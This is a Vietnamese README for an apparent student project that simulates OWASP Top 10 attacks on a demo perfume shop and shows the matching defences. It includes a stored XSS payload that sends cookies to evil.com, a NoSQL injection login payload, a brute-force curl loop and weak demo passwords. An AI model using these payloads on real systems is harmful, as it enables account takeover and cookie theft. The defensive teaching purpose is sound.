# 🛡️ MÔ PHỎNG CÁC KỊCH BẢN TẤN CÔNG WEB PHỔ BIẾN VÀ TRIỂN KHAI BIỆN PHÁP PHÒNG VỆ THEO OWASP

<p align="center">
  <img src="docs/images/owasp-logo.png" alt="OWASP Logo" width="200"/>
</p>

<p align="center">
  <strong>Nghiên cứu và triển khai các biện pháp bảo mật web theo chuẩn OWASP Top 10</strong>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/OWASP-Top%2010-red?logo=owasp" alt="OWASP"/>
  <img src="https://img.shields.io/badge/Node.js-20-green?logo=node.js" alt="Node.js"/>
  <img src="https://img.shields.io/badge/React-19-blue?logo=react" alt="React"/>
  <img src="https://img.shields.io/badge/MongoDB-7.0-green?logo=mongodb" alt="MongoDB"/>
  <img src="https://img.shields.io/badge/Security-Testing-orange" alt="Security"/>
</p>

---

## 📋 Mục Lục

- [Giới Thiệu Tổng Quan](#-giới-thiệu-tổng-quan)
- [OWASP Top 10 - 2021](#-owasp-top-10---2021)
- [Danh Sách Thành Viên](#-danh-sách-thành-viên)
- [Video Demo](#-video-demo)
- [Hướng Dẫn Cài Đặt](#-hướng-dẫn-cài-đặt)
- [Mô Phỏng Tấn Công & Phòng Vệ](#-mô-phỏng-tấn-công--phòng-vệ)
- [Tài Khoản Demo](#-tài-khoản-demo)
- [Kết Quả Demo](#-kết-quả-demo)

---

## 🎯 Giới Thiệu Tổng Quan

### 📌 Tên Đề Tài
**Mô Phỏng Các Kịch Bản Tấn Công Web Phổ Biến Và Triển Khai Biện Pháp Phòng Vệ Theo OWASP**

### 📌 Mô Tả Đề Tài

Đề tài tập trung nghiên cứu và triển khai các biện pháp bảo mật cho ứng dụng web dựa trên **OWASP Top 10** - danh sách 10 rủi ro bảo mật nghiêm trọng nhất cho ứng dụng web. Thông qua việc xây dựng một hệ thống **E-commerce bán nước hoa**, đề tài sẽ:

1. **Mô phỏng các kịch bản tấn công** phổ biến như SQL Injection, XSS, Broken Authentication...
2. **Triển khai biện pháp phòng vệ** theo chuẩn OWASP
3. **Demo và kiểm thử** tính hiệu quả của các biện pháp bảo mật

### 📌 Mục Tiêu Đề Tài

| STT | Mục tiêu | Mô tả |
|:---:|----------|-------|
| 1 | **Nghiên cứu OWASP Top 10** | Tìm hiểu 10 lỗ hổng bảo mật web phổ biến nhất |
| 2 | **Mô phỏng tấn công** | Thực hiện các kịch bản tấn công trên hệ thống test |
| 3 | **Triển khai phòng vệ** | Áp dụng các biện pháp bảo mật theo chuẩn OWASP |
| 4 | **Kiểm thử bảo mật** | Đánh giá hiệu quả của các biện pháp đã triển khai |
| 5 | **Xây dựng hệ thống mẫu** | Ứng dụng E-commerce với đầy đủ tính năng bảo mật |

### 📌 Phạm Vi Nghiên Cứu

```
┌─────────────────────────────────────────────────────────────────┐
│                    OWASP TOP 10 - 2021                          │
├─────────────────────────────────────────────────────────────────┤
│ A01 │ Broken Access Control         │ Kiểm soát truy cập lỗi   │
│ A02 │ Cryptographic Failures        │ Lỗi mã hóa               │
│ A03 │ Injection                     │ SQL/NoSQL/XSS Injection  │
│ A04 │ Insecure Design               │ Thiết kế không an toàn   │
│ A05 │ Security Misconfiguration     │ Cấu hình bảo mật sai     │
│ A06 │ Vulnerable Components         │ Thành phần lỗi thời      │
│ A07 │ Authentication Failures       │ Xác thực thất bại        │
│ A08 │ Data Integrity Failures       │ Lỗi toàn vẹn dữ liệu     │
│ A09 │ Logging & Monitoring Failures │ Thiếu giám sát           │
│ A10 │ SSRF                          │ Giả mạo yêu cầu server   │
└─────────────────────────────────────────────────────────────────┘
```

### 📌 Công Nghệ Sử Dụng

| Layer | Công nghệ | Mục đích |
|-------|-----------|----------|
| **Frontend** | React 19, TypeScript, Vite | Giao diện người dùng |
| **Backend** | Node.js 20, Express.js 5 | API Server |
| **Database** | MongoDB 7.0, Mongoose | Lưu trữ dữ liệu |
| **Security** | Helmet, Bcrypt, JWT, Joi | Bảo mật ứng dụng |
| **Testing** | Postman, OWASP ZAP | Kiểm thử bảo mật |
| **DevOps** | Docker, Docker Compose | Triển khai |

---

## 🔒 OWASP Top 10 - 2021

### Tổng Quan Các Lỗ Hổng Nghiên Cứu

| # | Lỗ hổng | Mức độ | Trạng thái |
|---|---------|--------|------------|
| A01 | Broken Access Control | 🔴 Critical | ✅ Đã triển khai phòng vệ |
| A02 | Cryptographic Failures | 🔴 Critical | ✅ Đã triển khai phòng vệ |
| A03 | Injection | 🔴 Critical | ✅ Đã triển khai phòng vệ |
| A04 | Insecure Design | 🟠 High | ✅ Đã triển khai phòng vệ |
| A05 | Security Misconfiguration | 🟠 High | ✅ Đã triển khai phòng vệ |
| A06 | Vulnerable Components | 🟡 Medium | ✅ Đã triển khai phòng vệ |
| A07 | Authentication Failures | 🔴 Critical | ✅ Đã triển khai phòng vệ |
| A08 | Data Integrity Failures | 🟠 High | ✅ Đã triển khai phòng vệ |
| A09 | Logging Failures | 🟡 Medium | ✅ Đã triển khai phòng vệ |
| A10 | SSRF | 🟠 High | ✅ Đã triển khai phòng vệ |

---

## 👥 Danh Sách Thành Viên

| STT | Họ và Tên | Vai trò | Công việc phụ trách |
|:---:|-----------|---------|---------------------|
| 1 | **Nguyễn Đăng Duy** | Thành viên | • Nghiên cứu OWASP A01, A03, A07<br>• Mô phỏng tấn công XSS, Injection<br>• Phát triển Frontend bảo mật<br>• Triển khai CSP, Input Validation<br>• Viết báo cáo và demo |
| 2 | **Đặng Thế Vũ** | Thành viên | • Nghiên cứu OWASP A02, A04, A05<br>• Mô phỏng tấn công Authentication<br>• Phát triển Backend bảo mật<br>• Triển khai JWT, Bcrypt, Rate Limiting<br>• Deploy Docker và kiểm thử |

### 📊 Chi Tiết Phân Công Công Việc

#### Nguyễn Đăng Duy

| Nhiệm vụ | Chi tiết | Trạng thái |
|----------|----------|------------|
| Nghiên cứu lý thuyết | OWASP A01 (Broken Access Control), A03 (Injection), A07 (Auth Failures) | ✅ Hoàn thành |
| Mô phỏng tấn công | XSS (Stored, Reflected, DOM-based), NoSQL Injection | ✅ Hoàn thành |
| Triển khai phòng vệ | Content Security Policy, Input Sanitization, Output Encoding | ✅ Hoàn thành |
| Phát triển Frontend | React components với validation, Secure forms | ✅ Hoàn thành |
| Kiểm thử | Test XSS payloads, Injection vectors | ✅ Hoàn thành |

#### Đặng Thế Vũ

| Nhiệm vụ | Chi tiết | Trạng thái |
|----------|----------|------------|
| Nghiên cứu lý thuyết | OWASP A02 (Crypto), A04 (Insecure Design), A05 (Misconfig) | ✅ Hoàn thành |
| Mô phỏng tấn công | Brute Force, Session Hijacking, CSRF | ✅ Hoàn thành |
| Triển khai phòng vệ | JWT Authentication, Bcrypt, Rate Limiting, Helmet | ✅ Hoàn thành |
| Phát triển Backend | Express.js API với middleware bảo mật | ✅ Hoàn thành |
| Deploy & Testing | Docker, Security headers testing | ✅ Hoàn thành |

---

## 🎬 Video Demo

### 📺 Xem Video Demo Đầy Đủ

| Nền tảng | Link | Nội dung |
|----------|------|----------|
| 🎥 **YouTube** | [https://youtu.be/YOUR_VIDEO_ID](https://youtu.be/YOUR_VIDEO_ID) | Demo đầy đủ |
| 📁 **Google Drive** | [https://drive.google.com/file/d/YOUR_FILE_ID](https://drive.google.com/file/d/YOUR_FILE_ID) | Bản gốc HD |

> ⚠️ **Lưu ý:** Thay thế `YOUR_VIDEO_ID` và `YOUR_FILE_ID` bằng link thực tế sau khi upload video.

### 📝 Nội Dung Video Demo

| Phần | Thời gian | Nội dung |
|------|-----------|----------|
| 1 | 0:00 - 2:00 | Giới thiệu đề tài và OWASP Top 10 |
| 2 | 2:00 - 5:00 | Demo hệ thống E-commerce |
| 3 | 5:00 - 10:00 | **Mô phỏng tấn công Injection** |
| 4 | 10:00 - 15:00 | **Mô phỏng tấn công XSS** |
| 5 | 15:00 - 20:00 | **Mô phỏng Brute Force Attack** |
| 6 | 20:00 - 25:00 | Demo các biện pháp phòng vệ |
| 7 | 25:00 - 30:00 | Kiểm thử với OWASP ZAP |
| 8 | 30:00 - 35:00 | Tổng kết và kết luận |

---

## 🚀 Hướng Dẫn Cài Đặt

### 📋 Yêu Cầu Hệ Thống

| Yêu cầu | Phiên bản | Ghi chú |
|---------|-----------|---------|
| Node.js | >= 20.x | Runtime |
| npm | >= 10.x | Package manager |
| Docker | >= 24.x | Containerization |
| MongoDB | >= 7.0 | Database |
| Git | Latest | Version control |

### 🐳 Cài Đặt Bằng Docker (Khuyến Nghị)

#### Bước 1: Clone Repository

```bash
git clone https://github.com/dangvu2405/frontend_react.git
cd frontend_react
```

#### Bước 2: Tạo File Environment

Tạo file `.env` trong thư mục gốc:

```env
# ============================================
# DATABASE
# ============================================
MONGODB_URI=mongodb://mongo:27017/PerfumeShop

# ============================================
# SECURITY - JWT
# ============================================
JWT_SECRET=your-super-secret-jwt-key-minimum-32-characters-for-security
JWT_REFRESH_SECRET=your-refresh-secret-key-minimum-32-characters
SESSION_SECRET=your-session-secret-key-minimum-32-characters

# ============================================
# ENVIRONMENT
# ============================================
NODE_ENV=production
FRONTEND_URL=http://localhost:5174
BACKEND_URL=http://localhost:3001

# ============================================
# RATE LIMITING (Chống Brute Force)
# ============================================
RATE_LIMIT_WINDOW_MS=900000
RATE_LIMIT_MAX_REQUESTS=100
AUTH_RATE_LIMIT_MAX=5
```

#### Bước 3: Build và Chạy Docker

```bash
# Build và khởi động
docker-compose up -d --build

# Xem logs
docker-compose logs -f

# Dừng services
docker-compose down
```

#### Bước 4: Truy Cập Ứng Dụng

| Service | URL | Mô tả |
|---------|-----|-------|
| 🌐 Frontend | http://localhost:5174 | Giao diện web |
| 🔧 Backend API | http://localhost:3001 | REST API |
| 🍃 MongoDB | localhost:27017 | Database |

![Docker Running](docs/images/docker-running.png)
*Hình 1: Docker containers đang chạy*

---

### 💻 Cài Đặt Thủ Công (Development)

#### Backend

```bash
cd backend
npm install
npm run dev
```

#### Frontend

```bash
cd frontend
npm install
npm run dev
```

---

## 📦 Cập Nhật Cơ Sở Dữ Liệu

### Kết Nối MongoDB

```bash
# Connection String
mongodb://localhost:27017/PerfumeShop

# Hoặc với Docker
docker exec -it perfume-shop-mongo mongosh
```

### Cấu Trúc Database

| Collection | Mô tả | Bảo mật |
|------------|-------|---------|
| `taikhoans` | Tài khoản (password đã hash) | ✅ Bcrypt |
| `sessions` | Phiên đăng nhập | ✅ JWT |
| `sanphams` | Sản phẩm | ✅ Validation |
| `donhangs` | Đơn hàng | ✅ Auth required |

### Tạo Dữ Liệu Mẫu

```javascript
// Tạo tài khoản Admin (password được hash tự động)
db.taikhoans.insertOne({
    TenDangNhap: "admin",
    Email: "admin@gmail.com",
    MatKhau: "$2b$10$...", // Bcrypt hash của "admin123"
    MaVaiTro: 1,
    TrangThai: true
});
```

---

## 🔓 Mô Phỏng Tấn Công & Phòng Vệ

### A01 - Broken Access Control

#### 🔴 Mô Phỏng Tấn Công: IDOR

```javascript
// Kẻ tấn công thử truy cập đơn hàng của người khác
GET /api/orders/USER_B_ORDER_ID
Authorization: Bearer USER_A_TOKEN

// Kỳ vọng: Truy cập được đơn hàng không thuộc về mình
```

#### ✅ Biện Pháp Phòng Vệ

```javascript
// File: backend/src/app/middlewares/auth.middleware.js
// Kiểm tra quyền sở hữu resource
if (order.MaTaiKhoan.toString() !== req.user._id.toString()) {
    return errorResponse(res, 'Không có quyền truy cập', 403);
}
```

![Access Control](docs/images/access-control-demo.png)
*Hình 2: Demo kiểm soát truy cập - Request bị từ chối*

---

### A03 - Injection

#### 🔴 Mô Phỏng Tấn Công: NoSQL Injection

```javascript
// Payload tấn công
POST /api/auth/login
{
    "username": { "$gt": "" },
    "password": { "$gt": "" }
}

// Kỳ vọng: Bypass authentication
```

#### ✅ Biện Pháp Phòng Vệ

```javascript
// File: backend/src/validations/auth.validation.js
const loginSchema = Joi.object({
    username: Joi.string().required(),  // ✅ Chỉ chấp nhận string
    password: Joi.string().required()
});

// Validate input trước khi xử lý
const { error } = loginSchema.validate(req.body);
if (error) {
    return errorResponse(res, 'Dữ liệu không hợp lệ', 400);
}
```

![Injection Prevention](docs/images/injection-demo.png)
*Hình 3: NoSQL Injection bị chặn bởi Joi validation*

---

### A03 - XSS (Cross-Site Scripting)

#### 🔴 Mô Phỏng Tấn Công: Stored XSS

```javascript
// Payload XSS trong đánh giá sản phẩm
POST /api/reviews
{
    "NoiDung": "<script>document.location='http://evil.com?c='+document.cookie</script>"
}
```

#### ✅ Biện Pháp Phòng Vệ

```javascript
// File: backend/src/server.js
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            scriptSrc: ["'self'"],  // ✅ Chỉ cho phép script từ origin
        }
    }
}));
```

![XSS Prevention](docs/images/xss-demo.png)
*Hình 4: XSS payload bị chặn bởi CSP*

---

### A07 - Authentication Failures

#### 🔴 Mô Phỏng Tấn Công: Brute Force

```bash
# Script brute force
for password in $(cat passwords.txt); do
    curl -X POST http://localhost:3001/api/auth/login \
         -d '{"username":"admin","password":"'$password'"}'
done
```

#### ✅ Biện Pháp Phòng Vệ

```javascript
// File: backend/src/app/middlewares/rateLimit.middleware.js
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000,  // 15 phút
    max: 5,                     // Tối đa 5 lần thử
    message: {
        success: false,
        message: 'Quá nhiều lần thử, vui lòng đợi 15 phút'
    },
    skipSuccessfulRequests: true
});
```

![Brute Force Prevention](docs/images/brute-force-demo.png)
*Hình 5: Brute Force bị chặn sau 5 lần thử*

---

### A02 - Cryptographic Failures

#### 🔴 Lỗ Hổng: Lưu Password Plain Text

```javascript
// ❌ KHÔNG AN TOÀN
const user = { password: "admin123" };  // Plain text!
```

#### ✅ Biện Pháp Phòng Vệ

```javascript
// File: backend/src/utils/password.js
const bcrypt = require('bcrypt');

// ✅ Hash password với bcrypt (salt rounds = 10)
const hashPassword = async (password) => {
    const salt = await bcrypt.genSalt(10);
    return await bcrypt.hash(password, salt);
};

// ✅ So sánh an toàn
const comparePassword = async (password, hash) => {
    return await bcrypt.compare(password, hash);
};
```

![Password Hashing](docs/images/password-hash-demo.png)
*Hình 6: Password được hash an toàn với Bcrypt*

---

### A05 - Security Misconfiguration

#### 🔴 Lỗ Hổng: Lộ thông tin server

```
X-Powered-By: Express  // ❌ Tiết lộ công nghệ
Stack trace trong response  // ❌ Lộ cấu trúc code
```

#### ✅ Biện Pháp Phòng Vệ

```javascript
// File: backend/src/server.js
app.disable('x-powered-by');  // ✅ Ẩn header

app.use(helmet({
    frameguard: { action: 'deny' },  // ✅ Chống Clickjacking
    xssFilter: true,                  // ✅ XSS Protection
    noSniff: true                     // ✅ Chống MIME sniffing
}));

// Error handler không lộ stack trace trong production
app.use((err, req, res, next) => {
    res.status(500).json({
        success: false,
        message: process.env.NODE_ENV === 'production' 
            ? 'Lỗi hệ thống' 
            : err.message
    });
});
```

![Security Headers](docs/images/security-headers-demo.png)
*Hình 7: Security headers được cấu hình đúng*

---

## 🔐 Tài Khoản Demo

### 👨‍💼 Tài Khoản Admin

| Thông tin | Giá trị |
|-----------|---------|
| **Email** | `admin@gmail.com` |
| **Mật khẩu** | `admin123` |
| **Quyền** | Quản trị viên |

### 👤 Tài Khoản User

| Thông tin | Giá trị |
|-----------|---------|
| **Email** | `user@gmail.com` |
| **Mật khẩu** | `user123` |
| **Quyền** | Khách hàng |

### 🧪 Tài Khoản Test Tấn Công

| Thông tin | Giá trị | Mục đích |
|-----------|---------|----------|
| **Email** | `attacker@test.com` | Test Brute Force |
| **Payload** | `{"$gt":""}` | Test NoSQL Injection |
| **Script** | `<script>alert(1)</script>` | Test XSS |

---

## 📸 Kết Quả Demo

### 🏠 Giao Diện Hệ Thống

![Trang chủ](docs/images/home.png)
*Hình 8: Giao diện trang chủ hệ thống E-commerce*

---

### 🔒 Demo Bảo Mật - Rate Limiting

![Rate Limiting](docs/images/rate-limit-result.png)
*Hình 9: Request bị block sau khi vượt quá giới hạn (5 lần/15 phút)*

---

### 🛡️ Demo Bảo Mật - Input Validation

![Validation](docs/images/validation-result.png)
*Hình 10: Input validation với Joi - Từ chối dữ liệu không hợp lệ*

---

### 🔐 Demo Bảo Mật - JWT Authentication

![JWT Auth](docs/images/jwt-auth-result.png)
*Hình 11: JWT Token với expiry time, HTTPOnly cookie*

---

### 📊 Demo Bảo Mật - Security Headers

![Headers Check](docs/images/headers-check.png)
*Hình 12: Kiểm tra security headers với securityheaders.com*

---

### 🔍 Kiểm Thử Với OWASP ZAP

![OWASP ZAP](docs/images/owasp-zap-result.png)
*Hình 13: Kết quả scan bảo mật với OWASP ZAP - Không phát hiện lỗ hổng nghiêm trọng*

---

## 📊 Tổng Kết Biện Pháp Đã Triển Khai

| OWASP | Lỗ hổng | Biện pháp | File |
|-------|---------|-----------|------|
| A01 | Broken Access Control | Auth Middleware, Role-based | `auth.middleware.js` |
| A02 | Cryptographic Failures | Bcrypt, JWT, HTTPOnly Cookie | `password.js`, `token.js` |
| A03 | Injection | Joi Validation, Mongoose Schema | `auth.validation.js` |
| A04 | Insecure Design | Rate Limiting, Business Logic | `rateLimit.middleware.js` |
| A05 | Security Misconfiguration | Helmet, CORS, Error Handler | `server.js` |
| A06 | Vulnerable Components | npm audit, Updated packages | `package.json` |
| A07 | Authentication Failures | JWT, Session, Rate Limit | `AuthController.js` |
| A08 | Data Integrity Failures | SameSite Cookie, CORS | `server.js` |
| A09 | Logging Failures | Morgan, Error Logging | `server.js` |
| A10 | SSRF | URL Validation, Whitelist | URL validation logic |

---

## 📁 Cấu Trúc Dự Án

```
perfume-shop/
├── 📁 backend/
│   ├── 📁 src/
│   │   ├── 📁 app/
│   │   │   ├── 📁 controllers/     # API logic
│   │   │   ├── 📁 middlewares/     # 🔒 Auth, Rate Limit
│   │   │   └── 📁 models/          # Database schemas
│   │   ├── 📁 validations/         # 🔒 Input validation (Joi)
│   │   ├── 📁 utils/
│   │   │   ├── password.js         # 🔒 Bcrypt hashing
│   │   │   └── token.js            # 🔒 JWT handling
│   │   └── server.js               # 🔒 Helmet, CORS
│   └── package.json
│
├── 📁 frontend/
│   ├── 📁 src/
│   │   ├── 📁 components/          # UI components
│   │   ├── 📁 services/            # API calls
│   │   └── 📁 contexts/            # Auth context
│   └── package.json
│
├── 📁 docs/
│   └── 📁 images/                  # Screenshots
│
├── docker-compose.yml
└── README.md
```

---

## 📚 Tài Liệu Tham Khảo

1. [OWASP Top 10 - 2021](https://owasp.org/Top10/)
2. [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)
3. [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
4. [Express.js Security Best Practices](https://expressjs.com/en/advanced/best-practice-security.html)

---

## 📞 Liên Hệ

| Thành viên | GitHub |
|------------|--------|
| Nguyễn Đăng Duy | [GitHub Profile] |
| Đặng Thế Vũ | [@dangvu2405](https://github.com/dangvu2405) |

---

## 📄 License

Dự án này được phát triển cho mục đích học tập và nghiên cứu về bảo mật web.

© 2025 - Đề tài Bảo Mật Web theo OWASP

---

<p align="center">
  <strong>🛡️ Bảo mật web không phải là tùy chọn, đó là yêu cầu bắt buộc! 🛡️</strong>
</p>
